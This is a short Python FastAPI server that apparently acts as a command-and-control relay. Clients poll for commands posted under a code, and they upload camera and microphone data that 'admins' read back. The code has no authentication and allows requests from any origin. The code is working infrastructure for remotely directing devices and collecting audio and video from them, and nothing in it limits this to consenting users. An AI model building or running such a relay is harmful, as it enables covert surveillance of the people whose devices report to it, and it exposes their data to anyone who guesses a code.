from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# Store commands for clients
commands = {}
# Store camera/mic data for admins
data_feed = {}

@app.post("/send/{code}")
async def send_cmd(code: str, request: Request):
    body = await request.json()
    commands[code] = body
    return {"status": "ok"}

@app.get("/get/{code}")
async def get_cmd(code: str):
    cmd = commands.get(code, {})
    commands[code] = {} # Clear after reading
    return cmd

@app.post("/feed/{code}")
async def send_data(code: str, request: Request):
    body = await request.json()
    data_feed[code] = body
    return {"status": "ok"}

@app.get("/read/{code}")
async def read_data(code: str):
    data = data_feed.get(code, {})
    return data

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=10000)
